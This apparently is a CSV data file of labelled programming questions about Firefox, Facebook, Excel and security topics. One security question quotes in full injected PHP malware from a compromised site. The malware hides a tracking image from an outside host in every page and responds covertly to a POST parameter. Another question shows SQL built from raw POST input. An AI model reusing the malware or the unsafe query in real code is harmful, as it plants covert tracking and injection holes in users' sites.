"Title","Body","Topic"
"How do I embed YouTube video that will work support keyboard in Firefox?","<p>I'm looking for a way to embed youtube/flash video to html page that will work in firefox using only keyboard support.</p>

<p>The problem is that in FF you can't set the focus in/out of the player using your keyboard. You must use the mouse (Not Accessible).</p>

<p>Any idea?
Thanks</p>
","Firefox"
"Visual realtime CSS specificity calculator?","<p>I have seen some online css specificity calculators but you have to upload the css files and do some manual work for it to do its work.</p>

<p>Is there a visual one like maybe a Firebug extension where when you click or hover over an element, it calculates it right there in real time?</p>
","Firefox"
"How do i find out if a user has liked my facebook app? (not a fan page)","<p>i can find out if user liked my facebook fan page ... </p>

<p>but now i have a facebook app (which i think doesn't have a page_id) and can't figure out how to do so. i've scoured the web but only resources i see are related to facebook page.</p>

<p>any ideas?</p>
","Facebook"
"Excel Conditional Formatting - IF this copy this cell","<p>I have a need to do some conditional formatting based off other cells.</p>

<p>Basically I need it to do:</p>

<p>If cell contains yes, use the formatting of cell A1
If cell contains no, use the formatting of cell B2</p>
","Excel"
"Does a router limit a outgoing connection to a particular host?","<p>This is being asked in he context of a router that has no port forwarding enabled.  I.e. no incoming connections accepted. Outgoing only.</p>

<p>I read something on a forum where someone said that whenever you as a client are behind a router, and connect to a particular host, then that opens up a port on your router and forwards ALL inbound traffic attempting to connect to the port, regardless of the source of that traffic, and thus while that connection is open it is just as insecure as if you setup port forwarding for that port.  In other words, some malicious third party, that is coming from some other address besides the host, could connect to that port.</p>

<p>My understanding was that when I initiate an outgoing connection to a host, then the listening port is limited to communication with that host address.  In otherwords, a third party's incoming connection would not be able to access that port.  However, this one lone person seemed to imply that only a firewall did this.  This kind of violates my understanding of how a connections works and how a router maps the listening port for an outgoing connection(I was going to add there's plenty of holes in my knowledge to violate, but then I realized that sounded really bad.).  </p>

<p>Does a router limit an outgoing connection to communicating with the destination host?  Or does the router also forward from other third parties that are not originating from the destination host if they try to connect to that listening port?</p>
","Security"
"Extended facebook access token","<p>I got a short-lived access token from the signed_request generated by facebook registration plugin inside the java class. After that I call the extended access token code 
i.e </p>

<pre><code>https://graph.facebook.com/oauth/access_token?client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;grant_type=fb_exchange_token&amp;fb_exchange_token=SHORT_LIVED_TOKEN
</code></pre>

<p>in the java class, and it returns a extended access token that valid for 60 days. I stored that in database.</p>

<p>After that until the short_lived_token expired, my ""login with facebook"" works well that means it calls the javascript method i.e fbLogin() that specified in the on-login attribute of ""facebook login plugin"" and regenerate a new short_lived_token.</p>

<p>The code is :</p>

<pre><code>&lt;fb:login-button on-login=""fbLogin();""
registration-url=""my_redirect_url""&gt;Login With Facebook&lt;/fb:login-button&gt;

&lt;script&gt;
function fbLogin()
{
  alert('inside fbLogin() method');
FB.getLoginStatus(function(response) {
  if (response.status === 'connected') {
    // the user is logged in and has authenticated your
    // app, and response.authResponse supplies
    // the user's ID, a valid access token, a signed
    // request, and the time the access token 
    // and signed request each expire
    var uid = response.authResponse.userID;
    var accessToken = response.authResponse.accessToken;
  } else if (response.status === 'not_authorized') {
    // the user is logged in to Facebook, 
    // but has not authenticated your app
  } else {
    // the user isn't logged in to Facebook.
  }
 });


} 
&lt;/script&gt;
</code></pre>

<p>Once the short_lived_token is expired that means the user doesn't use my application through facebook for some hours, after that trying to log in to his account by clicking ""Login With facebook"" button, then nothing happens.</p>

<p>It needs to de-authorize my application and run the complete process again.</p>

<p>How to use this extended access token here, and any ideas or suggestions to overcome this problem.</p>
","Facebook"
"What is intended fallback action for Firefox 3.x?","<p>Seems like Firefox displays a plugin with an ""X"" in older versions of Firefox (i.e. - any version below Firefox 4) and refuses to default to the flashplayer.  </p>

<p>I understand that Firefox 4 is supported by mediaelement.js in that it can play ogg video.  What is the intended 'handling' of video by mediaelement in older versions that don't support ogg video or html 5?</p>
","Firefox"
"How to post Flash applets to a wall on Facebook?","<p>In the comments of <a href=""http://stackoverflow.com/questions/8507289/post-interactive-html-content-to-user-wall"">this question</a>, users have commented that it's possible to insert a Flash applet into a Facebook wall post. I was under the impression this isn't possible without making a FB app.</p>

<p>I'm aware that FB will convert links to various media types - e.g. a link to a MP3 becomes automagically a SWF MP3 player, but the Flash applet used is chosen by FB's internal logic, not by the content of the post. Is it possible to embed a SWF applet <em>of your own choosing</em>?</p>

<p>As I haven't been able to find any documentation on this, has anyone else? Or, do you have some PoC code that does this?</p>
","Facebook"
"Facebook Share using shareKit only displays blank screen?","<p>i am using shareKit for Facebook/twitter sharing, when facebookSharing button clicked, it gives me the login page, but after first login it only displays a white screen and do nothing.  i have done some editing on SHKConfig.h and entered facebookKey and facebookSecret.</p>

<pre><code>#define SHKFacebookUseSessionProxy  NO 
#define SHKFacebookKey          @""""
#define SHKFacebookSecret       @""""
#define SHKFacebookSessionProxyURL  @""?""
</code></pre>

<p>while loading, it displays only white screen...</p>

<p>second problem: actually what should i given to the SHKFacebookSessionProxyURL field, is this makes my first problem?</p>
","Facebook"
"VB macro in excel to save an active doc to PDF with name from a Cell","<p>I'm new to the forum and I'm happy to be part of it. I've been having this specific problem for about three weeks now. </p>

<p>What I'm trying to do is to create a macro that automates a function for me. I have to deal with tons of contracts all the time and imputing information (like names, adresses and ID numbers) on each .doc than saving that doc as PDF is really time consuming. So I trying creating an excel table where I can imput that information which automaticaly saves to the .doc, this copy + paste is done with the special paste function (if I change something in the excel it changes the .doc so I have the whole contract typed out with some blank spaces that get filled in as I type in excel).</p>

<p>After filling up the cells in excel with the appropriate information I need to ""save as"" that doc as a PDF with the info from one of the cells (in this case the specific cell is where the company name's typed out), then I need o copy that excel table into a new tab that will have the name of the company (the same cell where the .doc was save as).</p>

<p>This is what I have so far:</p>

<pre><code>Sub Autocontratos()

Set appWD = CreateObject(""Word.Application"")
appWD.Visible = True

appWD.Documents.Open Filename:=""C:\Users\lguimaraes\Dropbox\Trabalho em equipe\Laurence\Contracts.docx""

appWD.ActiveDocument.SaveAs Filename:= _
    ThisWorkbook.Path &amp; ""/"" &amp; ""Contratos"" &amp; Range(""C2"").pdf, ExportFormat:= _
    wdExportFormatPDF, OpenAfterExport:=True, OptimizeFor:= _
    wdExportOptimizeForPrint, Range:=wdExportAllDocument, From:=1, To:=1, _
    Item:=wdExportDocumentContent, IncludeDocProps:=True, KeepIRM:=True, _
    CreateBookmarks:=wdExportCreateNoBookmarks, DocStructureTags:=True, _
    BitmapMissingFonts:=True, UseISO19005_1:=False
    ChangeFileOpenDirectory ""C:\Users\lguimaraes\Dropbox\Trabalho em equipe\Laurence\Contratos""

appWD.ActiveDocument.Close
appWD.Quit

End Sub
</code></pre>
","Excel"
"Button to call multiple class anchor click events only calls one then gives unhelping error","<p>I have written a greasemonkey script to customise the way I browse theawesomer.com. I wanted to have a little button I could click next to the post to store the link in a list so I could copy and paste the list into an email and send it to myself for later viewing. I have an email button in another version of the script which automates this fine, I just removed it from this post as it wasn't relevant.</p>

<p>The problem: I have this 'Remove All' button which should, using a jquery class selector, call the click event handler for each of the elements it finds. The click event removes a link in the list and the associated remove link button (not the 'Remove All' button). However it only removes the top item from the list and then throws an error saying 'Component not found' but doesn't point to a line in my code. Can anyone help me find out what is going wrong and how to fix it?</p>

<pre><code>// ==UserScript==
// @name           TheAwesomerLaterLink
// @namespace      theawesomer
// @include        http://theawesomer.com/*
// @include        http://www.theawesomer.com/*
// @require        https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js
// ==/UserScript==

function addStyle(style)
{
    var head = document.getElementsByTagName(""head"")[0];
    var element = head.appendChild(document.createElement('style'));
    element.innerHTML = style;
    return element;    
}

function createLinkInList(link, thisElement) // link = original link/buy anchor, thisElement = this post's new anchor (add button)
{
    var removeButton = $(document.createElement('img'))
                        .attr('src', 'http://alphadesigns.com.au/greasemonkey/removeButton.png')
                        .attr('title', 'Remove LaterLink')
                        .attr('alt', 'Remove LaterLink')
                        .css(
                        {
                            width: '16px',
                            heigth: '16px',
                            float: 'right'
                        });

    var removeLink = $(document.createElement('a'))
                    .addClass('removeLink')
                    .attr('rel', link.parents('.post').attr('id'))
                    .attr('title', 'Remove LaterLink')
                    .css('cursor', 'pointer')
                    .append(removeButton)
                    .click(function(e)
                    {
                        GM_log('start');
                        e.preventDefault();

                        // Restore add button if on same page still
                        if($('#' + $(this).attr('rel')).length &gt; 0)
                        {
                            var laterLink = $('#' + $(this).attr('rel')).find('.LaterLink');
                            laterLink.find('img').attr('src', 'http://alphadesigns.com.au/greasemonkey/addButton.png');
                            laterLink.unbind('click').click(function(e2)
                            {
                                e2.preventDefault();
                                createLinkInList(link, laterLink);
                            });
                        }

                        // Remove from list of links
                        $(this).parent().remove();
                        GM_log('end');
                    });

    var itemLink = $(document.createElement('a'))
                   .addClass('itemLink')
                   .text(link.parent().prev('h2').find('a').text())
                   .attr('href', link.attr('href'));

    var span = $(document.createElement('span'))
                    .append(itemLink)
                    .append(removeLink)
                    .append($(document.createElement('br')));

    $('#laterLinkList').append(span);

    $(thisElement).find('img').attr('src', 'http://alphadesigns.com.au/greasemonkey/disabledButton.png');

    $(thisElement).unbind('click');
}

$(document).ready(function()
{
    // Create Links
    $('.post .topmeta a').each(function()
    {
        var link = $(this);
        if(link.attr('title') == 'Link' || link.attr('title') == 'Buy')
        {
            // Track inclusion
            var insertionPoint = $(this).parent()
                                        .siblings('.metabar')
                                        .find('.rightmetabar &gt; span:last');

            // Check if we've already added a link for 'Link' or 'Buy' link
            if(insertionPoint.find('.LaterLink').length == 0)
            {
                newAnchor = $(document.createElement('a'))
                            .attr('rel', link.attr('href'))
                            .attr('class', 'LaterLink')
                            .attr('title', 'LaterLink')
                            .css('cursor', 'pointer')
                            .click(function(e)
                            {
                                e.preventDefault();
                                createLinkInList(link, this);
                            });

                newImage = $(document.createElement('img'))
                            .addClass('icon')
                            .attr('src', 'http://alphadesigns.com.au/greasemonkey/addButton.png')
                            .attr('title', 'LaterLink')
                            .attr('alt', 'LaterLink')
                            .css(
                            {
                                width: '16px',
                                height: '16px',
                                marginRight: '3px'
                            });

                newAnchor.append(newImage);

                // Put link in metabar next to other share links
                insertionPoint.prepend(newAnchor);
            }
        }
    });

    // Create List
    var panel = $('&lt;div id=""actionPanel""&gt;&lt;div class=""tab""&gt;&lt;ul class=""tabUL""&gt;&lt;li class=""left""&gt;&amp;nbsp;&lt;/li&gt;&lt;li id=""toggle""&gt;&lt;a id=""open"" class=""open""&gt;LinkLater&lt;/a&gt;&lt;a id=""close"" style=""display: none;"" class=""close""&gt;Close&lt;/a&gt;&lt;/li&gt;&lt;li class=""right""&gt;&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div id=""actionPanelContent""&gt;&lt;div class=""content clearfix""&gt;&lt;input id=""removeAll"" type=""button"" value=""Remove All"" /&gt;&lt;div id=""laterLinkList"" class=""left""&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;');

    // Attach panel to body
    $(document.body).not('iframe body').append(panel);

    // Attach 'remove all' function
    $('#removeAll').css({margin: '0 15px', float: 'right'})
                    .click(function(e)
                    {
                        e.preventDefault();
                        $('.removeLink').click();
                        return false;
                    });

    // Expand Panel
    $(""#open"").click(function(e)
    {
        e.preventDefault();
        $(""#actionPanelContent"").slideDown(""fast"");
    });    

    // Collapse Panel
    $(""#close"").click(function(e)
    {
        e.preventDefault();
        $(""#actionPanelContent"").slideUp(""fast"");
    });

    // Switch button from ""Open"" to ""Close"" on click
    $(""#toggle a"").click(function(e)
    {
        e.preventDefault();
        $(""#toggle a"").toggle();
    });

    // Apply stylesheet to panel
    addStyle('@import ""http://alphadesigns.com.au/greasemonkey/TheAwesomerLaterLink.css"";');
});
</code></pre>
","Firefox"
"Could anyone give me some suggestion about configure secure audit system","<p>I'm new about configure audit system. And I have some tasks such as</p>

<pre><code>configure audit system to audit failed attempts to access files and programs.
configure audit system to audit files and programs deleted by user...
...
</code></pre>

<p>I am very confused about the tasks.
Could anyone provided some tutorial or reference links? 
So that I can get clear about what is audit?<br>
How to configure audit system?</p>

<p>Thanks a lot! </p>
","Security"
"Profiling add-ons in firefox","<p>One new feature of ie9 I like is that it alerts you to which add-ons are making your browser run slowly. Is there a way to get access to similar information in firefox?</p>
","Firefox"
"Locking Desktop USB Ports","<p>How do you lock out the USB ports on the desktop PCs so we can prevent usage of USB drives on the desktops.</p>

<p>I should clarify that these are Windows XP desktops.</p>

<p>We should also assume that like most of the new desktops, many are using USB for keyboards and/or mice.</p>
","Security"
"js redirect if not in fb iframe","<p>i want to redirect all traffic going to my Facebook app tab on my server directly to my Facebook app. Therefore I check with the following code if the user is inside the Facebook iframe or on my webpage:</p>

<pre><code>&lt;!-- language: lang-js --&gt;
function referrerIsFacebookApp() {
    if(document.referrer) {
        return document.referrer.indexOf(""facebook.com"") !== -1;
    }
    return false;
}

if (!referrerIsFacebookApp()) {
    top.location.replace(""https://www.facebook.com/bommelME/app_264697733636385"");
};
</code></pre>

<p>If I open up the page with the browser everything works as it should. But if I link to this page and open the link the redirect doesnt work. Any hints?</p>
","Facebook"
"In Excel 2010, how can I show a count of occurrences on a specific date within multiple time ranges?","<p>Here's what I'm trying to do.  I have three columns of data.  ID, Date(MM/DD/YY), Time(00:00).</p>

<p>I need to create a chart or table that shows the number of occurrences on, say, 12/10/2010 between 00:00 and 00:59, 1:00 and 1:59, etc, for each hour of the day.</p>

<p>I can do countif and get results for the date, but I cannot figure out how to show a summary of the count of occurrences per hour for the 24 hour period.  I have months of data and many times each day.  Example of data set is below.  Any help is greatly </p>

<pre><code>ID     Date          Time  
221    12/10/2010    00:01  
223    12/10/2010    00:45  
227    12/10/2010    01:13  
334    12/11/2010    14:45  
</code></pre>

<p>I would like the results to read:</p>

<pre><code>Date          Time               Count  
12/10/2010    00:00AM - 00:59AM    2  
12/10/2010    01:00AM - 01:59AM    1  
12/10/2010    02:00AM - 02:59AM    0  
......(continues for every hour of the day)  
12/11/2010    00:00AM - 00:59AM    0  
.........  
12/11/2010    14:00PM - 14:59PM    1  
</code></pre>

<p>And so on.   Sorry for the length but I wanted to be clear.</p>

<p><strong>EDIT</strong><br>
Here is a sample spreadsheet.  Very little data, but I couldn't figure out a better way without having a huge file.  Tested in notepad for formatting and worked ok on import as csv.</p>

<pre><code>PID,Date,Time  
2888759,12/10/2010,0:10  
2888760,12/10/2010,0:10  
2888761,12/10/2010,0:10  
2888762,12/10/2010,0:11  
2889078,12/10/2010,15:45  
2889079,12/10/2010,15:57  
2889080,12/10/2010,15:57  
2889081,12/10/2010,15:58  
2889082,12/10/2010,16:10  
2889083,12/10/2010,16:11  
2889084,12/10/2010,16:11  
2889085,12/10/2010,16:12  
2889086,12/10/2010,16:12  
2889087,12/10/2010,16:12  
2889088,12/10/2010,16:13  
2891529,12/14/2010,16:21  
</code></pre>
","Excel"
"Console logging from a Firefox add-on","<p>The Mozilla documentation (<a href=""https://addons.mozilla.org/en-US/developers/docs/sdk/latest/dev-guide/console.html"" rel=""nofollow"">https://addons.mozilla.org/en-US/developers/docs/sdk/latest/dev-guide/console.html</a>) says that I should use <code>console.log</code> to generate messages from an extension. Those messages are said to appear in the Firefox Error Console. But this is not the case for me. I'm using the Addon builder for the first time today, and I'd like to create an extension that switches tabs on certain events. The tabs are indeed switched, and to a tab which I expected, so my code definitely runs. But the console.log output is nowhere to see.</p>

<p>I have set the filter to ""All"". All I see are CSS warnings from the addon builder itself.</p>

<p>I have also installed Firebug. It doesn't show anything, too. (This works fine when using console.log from the context of a web page though.) The problem with Firebug would be that it's only enabled for one/some tab anyway, so when switching tabs, it's useless. I need a log window that's always there.</p>

<p>So where will the output from console.log end up?</p>
","Firefox"
"How to order results for Facebook Graph API?","<p>I've been playing around the <a href=""http://developers.facebook.com/docs/api"" rel=""nofollow"">Facebook Graph API</a> for a while now. <br />
I'm trying to get the list of friends using <code>https://graph.facebook.com/me/friends</code>.</p>

<p>While it's working fine, the results are ordered by Id. Is there a way to get them ordered by name, or do I have to reorder them manually via my application layer?</p>

<p>Thanks!</p>
","Facebook"
"How can I add an automatic post to a user wall by a Facebook application?","<p>I have created a Facebook application that lets the user to select a photo. I want that when the user clicks to select a photo, that photo is be published in their wall. After that, then have them approve the application.</p>

<p>Application link is: <a href=""https://apps.facebook.com/emrijuaj/"" rel=""nofollow"">https://apps.facebook.com/emrijuaj/</a>.</p>

<p>I have created it with a PHP random, and setup to <a href=""http://en.wikipedia.org/wiki/Heroku"" rel=""nofollow"">Heroku</a> servers.</p>
","Facebook"
"read and write using phpexcel while using listWorksheetNames()","<p>I am having  a .xlsx file. In the .xlsx file there are 4 sheets ""activity"",
 ""performance"", ""store"", ""display"". 
I want to load only one sheet in the memory at a time and after adding data to
report write it. my code is below</p>

<pre><code>$objReader = PHPExcel_IOFactory::createReader('Excel2007');
$worksheet_names = $objReader-&gt;listWorksheetNames('/tmp/ac.xlsx');
$objReader-&gt;setLoadSheetsOnly('store');
$objPHPExcel = $objReader-&gt;load('/tmp/ac.xlsx');
$objPHPExcel-&gt;setActiveSheetIndexByName('store');
$sheet = $objPHPExcel-&gt;getActiveSheet();
$max_row = $sheet-&gt;getHighestRow();
$sheet-&gt;setCellValue(""A$max_row"", ""Data"");
$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
$objWriter-&gt;setPreCalculateFormulas(false);
$objWriter-&gt;save('/tmp/ac.xlsx');
$objPHPExcel-&gt;disconnectWorksheets();
unset($objPHPExcel);
</code></pre>

<p>the problem is it is writing on store sheet and deleting all the other sheets.
How do i make remain all the sheets while updating 'store sheet' 
is there any function which will write one sheet at a time while 
retaining the other sheets.</p>
","Excel"
"Facebook with iOS5 and iOS6","<p>I'm about to release an app and it must support both iOS5 and iOS6. But with the new Facebook SDK 3.1 i'm not quite sure on how to integrate the Facebook functionality to work with both iOS versions. </p>

<p>What is the best approach to make both the login and wall posting actions to work in iOS5 and iOS6 version? Are there any best-practices already?</p>

<p>Many thanks in advance!</p>
","Facebook"
"HTML coding for Facebook LIke Box on personal WEbsite","<p>My software I use to create my webpage - IWEB (on Macbook PRO) doesn't support HTML5 coding that you use for the Facebook LIKEBOX.  It is a drag &amp; drop program whereby you can drag a HTML 'snippet' box which you copy &amp; paste the coding into.  (I don't write code)</p>

<p>I have had an older HTML code in there &amp; only yesterday I tried to update with the new code &amp; realised its HTML5.  </p>

<p>I have tried various codes from the internet one displays the box correctly within the program.... but when I publish the page nothing can be seen on the website.</p>



<p>Apologies if I am being vague, or not using 'code speak' - I am not a programmer.
Regards</p>
","Facebook"
"insert calculated field in pivot table based on previous row of one column","<p>I want to create a calculated field BookCnt_Diff which would be row1-row2 and if RPT DT = grand total then 0..  this data is the result of a query which looks back 6 months so I want to be able to refresh the data monthly.  I would also want the same Diff column for Shelf_cnt preferably between the originals </p>

<pre><code>Values

 Rpt Dt           Book_Cnt     BookCnt_Diff       Shelf_Cnt 

 09/01/2012       5,604,552     15037            9,119,375 
 08/01/2012       5,589,515                      9,096,615 
 07/01/2012       5,576,289                      9,077,553 
 06/01/2012       5,590,771                      9,069,373 
 05/01/2012       5,586,510                      9,060,378 
 04/01/2012       5,572,887                      9,035,119 
 Grand Total     33,520,524                     54,458,413 
</code></pre>

<p>On top of that when trying to get the getpivotdata to work the way I want so far was impossible... and m$ unhelp is so useful
thanks</p>

<p><em>Not from OP</em>: Perhaps a help in showing result required:</p>

<p><img src=""http://i.stack.imgur.com/WadCg.jpg"" alt=""SU490037 example""></p>
","Excel"
"should I escape wildcards in a ""LIKE"" sql query?","<p>suppose I have a <code>LIKE</code> sql statement stored in a variable like this:</p>

<pre><code>$movie_title = $_POST['movie_title'];
$query= ""SELECT movie FROM movies WHERE title LIKE '%"" . $movie_title . ""%'"";
</code></pre>

<p>What instance of an sql injection attack would I prevent by escaping the wildcards <code>%</code> and <code>_</code>?</p>
","Security"
"Excel 2002 VBA compile error with code for later versions of Excel","<p>I'm trying to use the following code in a spreadsheet that will be used across a wide range of versions of Excel :-</p>

<pre><code>Sheets(""Graph"").ChartObjects(""Chart 1"").Activate
ActiveChart.ClearToMatchStyle
</code></pre>

<p>If I include this code as normal, it will not compile under Excel 2002, but will work fine in later versions. I don't think the .ClearToMatchStyle command is available in Excel 2002, and this is where it's falling down. </p>

<p>Is there a way I can use the code above, but only activate the commands if a version of Excel later than 2002 is found ?</p>

<p>Many thanks for any help, </p>

<p>Martin</p>
","Excel"
"How to Paste copied Row from one Sheet to Another","<p>I have two Excel worksheets: Sheet1 and Sheet2.  Sheet2 is the master list while Sheet1 is the updated worksheet I receive from the system.  What I need is to compare each value of Col A of Sheet1 with Sheet2.  If there is a match, then I want to copy the entire matching row from Sheet1 and paste values from that row to the corresponding ColA value (Item#) row of Sheet2.  Example shown below:</p>

<p><strong>Sheet1 Worksheet</strong></p>

<pre><code>ColA                                      ColB

Item#                                     Updated Cost

1234                                      $30
</code></pre>

<p><strong>Sheet2 Worksheet</strong></p>

<pre><code>ColA                                      ColB

Item#                                     Current Cost

1234                                      $45
</code></pre>

<p>There are more columns in my file than shown here, so its necessary to copy the entire row with the corresponding row in Sheet2.  I started the needed Excel VBA code, but I'm stuck on the part to paste corresponding values in Sheet2.  My code is pretty basic and it isn't working yet, so any help related to coding is appreciated.</p>

<pre><code>Sub Macro1()
'
' Macro1 Macro
'
'   Copies corresponding item# rows from sheet1 worksheet
'   to sheet2 worksheet by comparing item# column

Dim ws1 As Worksheet
Dim ws2 As Worksheet
Dim ColA As String
Dim rng1 As Range
Dim rng2 As Range
Dim RowCounter1 As Integer
Dim RowCounter2 As Integer

ColA = ""A""

RowCounter1 = 2
RowCounter2 = 2

Set ws1 = Worksheets(""Sheet1"")
Set ws2 = Worksheets(""Sheet2"")

Do While Not IsEmpty(ws1.Range(ColA &amp; RowCounter1).Value)

    Set rng1 = ws1.Range(ColA &amp; RowCounter1)

    RowCounter2 = 1
    Do While Not IsEmpty(ws2.Range(ColA &amp; RowCounter2).Value)

        Set rng2 = ws2.Range(ColA &amp; RowCounter2) 
        If rng1.Value = rng2.Value Then 
             Rows(RowCounter1).EntireRow.Copy                  
             RowCounter2 = RowCounter2 - 1  
        End If
        RowCounter2 = RowCounter2 + 1

    Loop
    RowCounter1 = RowCounter1 + 1
Loop

End Sub
</code></pre>
","Excel"
"my website keeps getting injected with code. what methods of security should i implement?","<p>my host is godaddy but that is all that i can afford right now.</p>

<p>these are the security checks that I've already done.</p>

<ol>
<li>filtered all input fields and<br>
get/posts values</li>
<li>tested a penetration application against my apps using accunetix which is very good at what it does. it uses xss,sql injection, directory traversal and more against the site. logged and not.</li>
</ol>

<p>each file listed in the site has permissions of 705 is that good or bad? most pages are just read only whereas others are read/write not sure what execute does though. dont all php pages need to be executed to generate html?</p>

<p>when setting permissions there is owner,group,other and each has read,write,execute what are their differences?</p>

<p>what else can it possible be? if i were to contact godaddy right now they would say its my fault.</p>

<p>ps:</p>

<p>the hosting and ftp logins are 8 characters and contain letters and numbers. same with the mysql db</p>

<p>injected code:</p>

<pre><code>&lt;?php
//{{254709f3

GLOBAL $alreadyxxx;
if($alreadyxxx != 1)
{
$alreadyxxx = 1;

$olderrxxx=error_reporting(0);

function outputxxx_callback($str)
{
  $links = '&lt;SPAN STYLE=""font-style: normal; visibility: hidden; position: absolute; left: 0px; top: 0px;""&gt;&lt;div id=""x84da620661febfa679b0046c4""&gt;&lt;img width=0 height=0 src=""http://airschk.com/countimg.gif?id=4da620661febfa679b0046c4&amp;p=1""&gt;&lt;/div&gt;&lt;/SPAN&gt;';
  preg_match(""|&lt;/body&gt;|si"",$str,$arr);
  return str_replace($arr[0],$links.$arr[0],$str);
}

function StrToNum($Str, $Check, $Magic)
{
   $Int32Unit = 4294967296;
   $length = strlen($Str);
   for ($i = 0; $i &lt; $length; $i++) {
       $Check *= $Magic;
       if ($Check &gt;= $Int32Unit) {
           $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit));
           $Check = ($Check &lt; -2147483648) ? ($Check + $Int32Unit) : $Check;
       }
       $Check += ord($Str{$i});
   }
   return $Check;
}
function HashURL($String)
{
   $Check1 = StrToNum($String, 0x1505, 0x21);
   $Check2 = StrToNum($String, 0, 0x1003F);

   $Check1 &gt;&gt;= 2;
   $Check1 = (($Check1 &gt;&gt; 4) &amp; 0x3FFFFC0 ) | ($Check1 &amp; 0x3F);
   $Check1 = (($Check1 &gt;&gt; 4) &amp; 0x3FFC00 ) | ($Check1 &amp; 0x3FF);
   $Check1 = (($Check1 &gt;&gt; 4) &amp; 0x3C000 ) | ($Check1 &amp; 0x3FFF);

   $T1 = (((($Check1 &amp; 0x3C0) &lt;&lt; 4) | ($Check1 &amp; 0x3C)) &lt;&lt;2 ) | ($Check2 &amp; 0xF0F );
   $T2 = (((($Check1 &amp; 0xFFFFC000) &lt;&lt; 4) | ($Check1 &amp; 0x3C00)) &lt;&lt; 0xA) | ($Check2 &amp; 0xF0F0000 );

   return ($T1 | $T2);
}

function CheckHash($Hashnum)
{
   $CheckByte = 0;
   $Flag = 0;

   $HashStr = sprintf('%u', $Hashnum) ;
   $length = strlen($HashStr);

   for ($i = $length-1; $i &gt;= 0;  $i--) {
       $Re = $HashStr{$i};
       if (1 === ($Flag % 2)) {
           $Re += $Re;
           $Re = (int)($Re / 10) + ($Re % 10);
       }
       $CheckByte += $Re;
       $Flag ++;
   }

   $CheckByte %= 10;
   if (0 !== $CheckByte) {
       $CheckByte = 10 - $CheckByte;
       if (1 === ($Flag % 2) ) {
           if (1 === ($CheckByte % 2)) {
               $CheckByte += 9;
           }
           $CheckByte &gt;&gt;= 1;
       }
   }

   return '7'.$CheckByte.$HashStr;
}

function getpr($url)
{
   $ch = CheckHash(HashURL($url));
   $file = ""http://toolbarqueries.google.com/search?client=navclient-auto&amp;ch=$ch&amp;features=Rank&amp;q=info:$url"";;
   $data = file_get_contents($file);
   $pos = strpos($data, ""Rank_"");
   if($pos === false){return -1;} else{
       $pr=substr($data, $pos + 9);
       $pr=trim($pr);
       $pr=str_replace(""
"",'',$pr);
       return $pr;
   }
}

if(isset($_POST['xxxprch']))
{
    echo getpr($_POST['xxxprch']);
    exit();
}
else
  ob_start('outputxxx_callback');

error_reporting($olderrxxx);
}

//}}964825b0
?&gt;
</code></pre>
","Security"
"Read excel file in c# using dynamic keyword","<p>How can I read the excel file using C# 4.0. Once I saw in some video it becomes very easy to read the file using dynamic keyword but now when I search to find any tutorial, I can't seem to find any. Can anybody point me in some direction or give some snippet that reads from excel file (.xlxs). I only want to read the first sheet but that sheet can contains any columns and rows. I want to read them all. The data contained in the sheet is just simply numbers and strings. No more than that!</p>

<p>Thanks in advance :)</p>
","Excel"
"Facebook like button adds query strin to the url","<p>i am implementing the facebook like button, and specified for it the url to like,
when i click on the LIKE button, in facebook i saw the correct page the liked, but when i click on the link there
the link is what is specified in the code with some odd facebook querystring appended.</p>

<p>for exmpl:
the page that i like is
<a href=""http://www.mydomain.com/path/to/the/page"" rel=""nofollow"">http://www.mydomain.com/path/to/the/page</a></p>

<p>when i clicked on the liked link in facebook, the url is:
<a href=""http://www.mydomain.com/path/to/the/page"" rel=""nofollow"">http://www.mydomain.com/path/to/the/page</a><strong>?fb_action_ids=#####&amp;fb_action_types=og.likes&amp;fb_source=timeline_og&amp;action_object_map={""###""%###}&amp;action_type_map={""###""%3A""og.likes""}&amp;action_ref_map=[]</strong></p>

<p>and the page is not loaded correctly, is this is a facebook fault?</p>
","Facebook"
